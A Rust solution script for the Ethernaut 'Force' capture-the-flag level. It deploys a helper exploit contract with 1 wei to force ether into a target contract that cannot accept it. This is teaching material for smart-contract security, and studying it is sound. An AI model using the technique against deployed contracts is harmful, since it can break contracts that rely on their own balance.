//! Ethernaut 07 — Force.
//!
//! Goal: Give the otherwise empty `Force` contract a positive Ether balance.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/Force.sol

use alloy::primitives::U256;
use alloy::sol;
use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl07_force::*;

pub struct Exploit;

sol!(
    #[sol(rpc)]
    ForceExploit,
    "out/ForceExploit.sol/ForceExploit.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        ForceExploit::deploy_builder(offender.provider(), target.address)
            .value(U256::from(1))
            .deploy()
            .await?;
        Ok(())
    }
}
